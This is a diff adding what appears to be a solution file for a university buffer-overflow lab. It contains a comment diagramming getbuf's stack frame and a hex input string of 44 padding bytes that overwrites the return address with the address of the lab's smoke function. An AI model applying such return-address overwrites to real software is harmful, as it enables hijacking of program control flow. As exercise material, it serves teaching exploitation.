@@ -1,0 +1,13 @@
+/*
+ stack of <getbuf>:
+                      ......
+ return address <-- |--------|   0x0
+ old EBP        <-- |--------|  -0x4
+                    |--------|
+                      ......
+ string         <-- |--------| -0x2C
+                      ......
+ The target is to make EIP the address of <smoke>.
+ <smoke> function address: 0x08 04 8C 90
+ */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90 8C 04 08
